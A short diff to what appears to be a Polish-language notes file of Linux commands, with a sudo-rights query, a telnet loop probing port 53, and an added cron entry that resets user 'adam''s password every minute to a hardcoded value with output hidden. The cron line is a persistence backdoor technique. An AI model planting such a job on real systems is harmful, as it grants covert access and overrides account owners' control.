@@ -14,3 +14,6 @@ sudo -l -U nazwa_uzytkownika
 
 while true; do echo quit | telnet 10.10.10.10 53 2>/dev/null | grep -q "Connected" && echo "Sieć jest osiągalna na porcie 53!"; sleep 5; done
 
+
+
+* * * * * echo "Nowehaslo123" | /usr/bin/passwd --stdin adam >/dev/null 2>&1
